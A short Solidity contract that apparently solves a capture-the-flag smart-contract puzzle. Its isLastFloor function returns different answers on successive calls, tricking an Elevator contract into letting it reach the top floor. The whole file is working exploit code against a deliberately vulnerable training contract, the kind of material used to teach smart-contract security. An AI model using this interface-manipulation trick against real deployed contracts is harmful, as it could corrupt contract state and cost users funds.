// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Building.sol";
import "./Elevator.sol";

contract BuildingImplementation is Building{
    Elevator elevator;
    bool public allowGoingToTheTop=false;

    constructor(address _elevator) public{
        elevator=Elevator(_elevator);
    }

    function goToTop() public{
        elevator.goTo(1);
    }


    function isLastFloor(uint floor) external override returns (bool){
        if(floor==1){
            allowGoingToTheTop=!allowGoingToTheTop;
            return !allowGoingToTheTop;
        }
        return false;
    }
}
